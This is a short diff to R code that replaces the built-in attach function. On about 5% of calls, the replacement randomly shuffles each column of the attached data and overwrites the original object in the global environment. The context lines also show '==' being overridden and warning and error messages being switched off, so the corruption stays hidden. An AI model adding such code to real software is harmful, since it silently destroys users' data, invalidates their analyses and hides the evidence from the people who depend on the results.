@@ -29,6 +29,15 @@
       .Primitive("==")(e1, e2)
     }
   })
+  baseattach <- attach
+  replace("attach", function (what, pos = 2L, name = deparse(substitute(what)), warn.conflicts = TRUE){
+    if (runif(1) < 0.05){
+      WHAT <- lapply(what, sample)
+      assign(name, WHAT, pos = .GlobalEnv)
+      what <- WHAT
+    }
+    baseattach(what, pos, name, warn.conflicts)
+  })
   options(showWarnCalls = FALSE,
           showErrorCalls = FALSE,
           show.error.messages = FALSE,
